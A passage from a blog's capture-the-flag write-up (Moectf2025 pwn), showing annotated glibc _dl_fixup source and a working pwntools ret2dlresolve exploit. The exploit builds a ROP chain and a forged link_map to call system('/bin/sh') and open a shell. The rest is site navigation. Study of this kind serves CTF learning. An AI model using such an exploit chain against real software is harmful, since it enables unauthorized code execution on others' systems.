=</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">                version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">       not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">       we are not using any threads (yet).  */</span></span><br><span class="line">        <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;</span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">// 查找目标函数地址</span></span><br><span class="line">        <span class="comment">// result 为 libc 的 link_map ，其中有 libc 的基地址。</span></span><br><span class="line">        <span class="comment">// sym 指针指向 libc 中目标函数对应的符号表，其中有目标函数在 libc 中的偏移。</span></span><br><span class="line">        result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                                     version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">       of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">       offset.  */</span></span><br><span class="line">        <span class="comment">// 基址 + 偏移算出目标函数地址 value</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">       address) is also known.  */</span></span><br><span class="line">        <span class="comment">// 这里认为 link_map 和 sym 中已经是目标函数的信息了，因此直接计算目标函数地址。</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">        result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">    value = elf_machine_plt_value(l, reloc, value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect(ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">        value = elf_ifunc_invoke(DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    <span class="comment">// 更新 got 表</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt(l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">new_stack = bss_addr + <span class="number">0x200</span>  <span class="comment"># 新栈起始地址</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line">plt0 = <span class="number">0x401020</span>   </span><br><span class="line">pop_rdi_ret = <span class="number">0x40115e</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x401160</span></span><br><span class="line">resolve = <span class="number">0x401026</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404080</span></span><br><span class="line">fake_link_map_addr = bss + <span class="number">0x400</span></span><br><span class="line">binsh = fake_link_map_addr + <span class="number">0x50</span></span><br><span class="line">offset = libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;read&#x27;</span>] <span class="comment"># 选择一个已解析的函数</span></span><br><span class="line">fake_link_map = p64(offset &amp; <span class="number">0xffffffffffffffff</span>) <span class="comment"># 需要这样调整一下否则 p64() 会报错</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>] - <span class="number">0x8</span>)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64((bss - offset) &amp; <span class="number">0xffffffffffffffff</span>) + p32(<span class="number">7</span>) + p32(<span class="number">0</span>)  </span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) + p64(fake_link_map_addr + <span class="number">0x20</span>)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(bss) <span class="comment"># l_info[5] -&gt; 可读写地址即可</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_link_map_addr + <span class="number">0x10</span>) <span class="comment"># l_info[6]</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0xf8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_link_map_addr + <span class="number">0x40</span>) <span class="comment"># l_info[23]</span></span><br><span class="line"><span class="comment"># 此处 r_offset + l_addr 为可读写地址即可</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span></span><br><span class="line">payload += p64(pop_rdi_ret) </span><br><span class="line">payload += p64(<span class="number">0</span>) </span><br><span class="line">payload += p64(pop_rsi_ret) </span><br><span class="line">payload += p64(fake_link_map_addr) </span><br><span class="line">payload += p64(read_plt) </span><br><span class="line">payload += p64(pop_rdi_ret) </span><br><span class="line">payload += p64(binsh) </span><br><span class="line">payload += p64(resolve) </span><br><span class="line">payload += p64(fake_link_map_addr) </span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">p.send(fake_link_map.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://LightCloveyou.github.io">LightCloveyou</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lightcloveyou.github.io/2025/10/12/Moectf2025-pwn/">https://lightcloveyou.github.io/2025/10/12/Moectf2025-pwn/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://LightCloveyou.github.io" target="_blank">LightCloveyou's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width no-desc" href="/2025/10/22/LinearAlgebraNote/" title="LinearAlgebraNote"><img class="cover" src="/img/2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">LinearAlgebraNote</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/10/27/Whuctf2025/" title="Whuctf2025"><img class="cover" src="/img/6.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-27</div><div class="info-item-2">Whuctf2025</div></div><div class="info-2"><div class="info-item-1">凡是有意义的事都不会容易，真正有意义的事从来没有简单二字</div></div></div></a><a class="pagination-related" href="/2025/10/30/heap-all-in-one/" title="heap-all-in-one"><img class="cover" src="/img/12.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-30</div><div class="info-item-2">heap-all-in-one</div></div><div class="info-2"><div class="info-item-1">永不放弃，永不停止</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">LightCloveyou</div><div class="author-info-description">PWN your Heart</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LightCloveyou/LightCloveyou.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#moectf2025-%E6%96%B0%E7%94%9F%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">Moectf2025 新生赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez_u64"><span class="toc-number">1.0.1.</span> <span class="toc-text">ez_u64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find_it"><span class="toc-number">1.0.2.</span> <span class="toc-text">find_it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inject"><span class="toc-number">1.0.3.</span> <span class="toc-text">inject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">1.0.4.</span> <span class="toc-text">Ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.0.5.</span> <span class="toc-text">Ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prelibc"><span class="toc-number">1.0.6.</span> <span class="toc-text">Prelibc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easylibc"><span class="toc-number">1.0.7.</span> <span class="toc-text">Easylibc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezcanary"><span class="toc-number">1.0.8.</span> <span class="toc-text">Ezcanary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezpivot"><span class="toc-number">1.0.9.</span> <span class="toc-text">Ezpivot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hardpivot"><span class="toc-number">1.0.10.</span> <span class="toc-text">hardpivot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmt"><span class="toc-number">1.0.11.</span> <span class="toc-text">fmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmt_s"><span class="toc-number">1.0.12.</span> <span class="toc-text">fmt_s</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmt_t"><span class="toc-number">1.0.13.</span> <span class="toc-text">fmt_t</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#boom-boom_revenge"><span class="toc-number">1.0.14.</span> <span class="toc-text">boom &amp; boom_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#randomlock"><span class="toc-number">1.0.15.</span> <span class="toc-text">randomlock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#syslock"><span class="toc-number">1.0.16.</span> <span class="toc-text">syslock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#str_check"><span class="toc-number">1.0.17.</span> <span class="toc-text">str_check</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#strcpydest-src"><span class="toc-number">1.0.17.0.0.1.</span> <span class="toc-text">1. strcpy(dest, src)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#strncpydest-src-n"><span class="toc-number">1.0.17.0.0.2.</span> <span class="toc-text">2. strncpy(dest, src, n)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#strcatdest-src"><span class="toc-number">1.0.17.0.0.3.</span> <span class="toc-text">3. strcat(dest, src)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#strncatdest-src-n"><span class="toc-number">1.0.17.0.0.4.</span> <span class="toc-text">4. strncat(dest, src, n)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#memcpydest-src-n"><span class="toc-number">1.0.17.0.0.5.</span> <span class="toc-text">5. memcpy(dest, src, n)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#strlens"><span class="toc-number">1.0.17.0.0.6.</span> <span class="toc-text">6. strlen(s)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#strcmps1-s2strncmps1-s2-n"><span class="toc-number">1.0.17.0.0.7.</span> <span class="toc-text">7. strcmp(s1, s2)、strncmp(s1, s2, n)</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xdulaker"><span class="toc-number">1.0.18.</span> <span class="toc-text">xdulaker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellbox"><span class="toc-number">1.0.19.</span> <span class="toc-text">shellbox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jop"><span class="toc-number">1.0.20.</span> <span class="toc-text">JOP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">1.0.21.</span> <span class="toc-text">Ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#elf-header"><span class="toc-number">1.0.21.1.</span> <span class="toc-text">ELF Header</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%8D"><span class="toc-number">1.0.21.1.1.</span> <span class="toc-text">32位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%8D-1"><span class="toc-number">1.0.21.1.2.</span> <span class="toc-text">64位</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#elf-section-header-table"><span class="toc-number">1.0.21.2.</span> <span class="toc-text">ELF Section Header Table</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%8D-2"><span class="toc-number">1.0.21.2.1.</span> <span class="toc-text">32位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%8D-3"><span class="toc-number">1.0.21.2.2.</span> <span class="toc-text">64位</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.21.3.</span> <span class="toc-text">延迟绑定流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#plt%E4%B8%8Eplt.sec"><span class="toc-number">1.0.21.4.</span> <span class="toc-text">plt与plt.sec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#got%E4%B8%8Egot.plt"><span class="toc-number">1.0.21.5.</span> <span class="toc-text">got与got.plt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#symtab"><span class="toc-number">1.0.21.6.</span> <span class="toc-text">.symtab</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rel.text.rel.data"><span class="toc-number">1.0.21.7.</span> <span class="toc-text">.rel.text&#x2F;.rel.data</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strtab"><span class="toc-number">1.0.21.8.</span> <span class="toc-text">.strtab</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dynamic"><span class="toc-number">1.0.21.9.</span> <span class="toc-text">.dynamic</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#link_map_x86"><span class="toc-number">1.0.21.10.</span> <span class="toc-text">link_map_x86</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dl_runtime_resolve"><span class="toc-number">1.0.21.11.</span> <span class="toc-text">_dl_runtime_resolve</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/28/Assembly/" title="Assembly"><img src="/img/20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Assembly"/></a><div class="content"><a class="title" href="/2025/11/28/Assembly/" title="Assembly">Assembly</a><time datetime="2025-11-28T03:45:14.000Z" title="发表于 2025-11-28 11:45:14">2025-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/21/Calculus/" title="Calculus"><img src="/img/15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Calculus"/></a><div class="content"><a class="title" href="/2025/11/21/Calculus/" title="Calculus">Calculus</a><time datetime="2025-11-21T11:40:08.000Z" title="发表于 2025-11-21 19:40:08">2025-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="格式化字符串漏洞利用"><img src="/img/19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="格式化字符串漏洞利用"/></a><div class="content"><a class="title" href="/2025/11/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="格式化字符串漏洞利用">格式化字符串漏洞利用</a><time datetime="2025-11-14T08:09:11.000Z" title="发表于 2025-11-14 16:09:11">2025-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/30/heap-all-in-one/" title="heap-all-in-one"><img src="/img/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="heap-all-in-one"/></a><div class="content"><a class="title" href="/2025/10/30/heap-all-in-one/" title="heap-all-in-one">heap-all-in-one</a><time datetime="2025-10-30T06:21:58.000Z" title="发表于 2025-10-30 14:21:58">2025-10-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/27/Whuctf2025/" title="Whuctf2025"><img src="/img/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Whuctf2025"/></a><div class="content"><a class="title" href="/2025/10/27/Whuctf2025/" title="Whuctf2025">Whuctf2025</a><time datetime="2025-10-27T09:40:19.000Z" title="发表于 2025-10-27 17:40:19">2025-10-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/13.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By LightCloveyou</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><meting-js class="no-destroy" id="8932390" server="netease" type="playlist" fixed="true" autoplay="false" order="random" volume="0.3" list-folded="false" list-max-height="36vh"> </meting-js><link rel="stylesheet" href="https://npm.elemecdn.com/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://npm.elemecdn.com/aplayer/dist/APlayer.min.js"></script><script src="https://npm.elemecdn.com/meting/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.bootcdn.net/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => {
      try {
        fn()
      } catch (err) {
        console.debug('Pjax callback failed:', err)
      }
    })
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      false
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>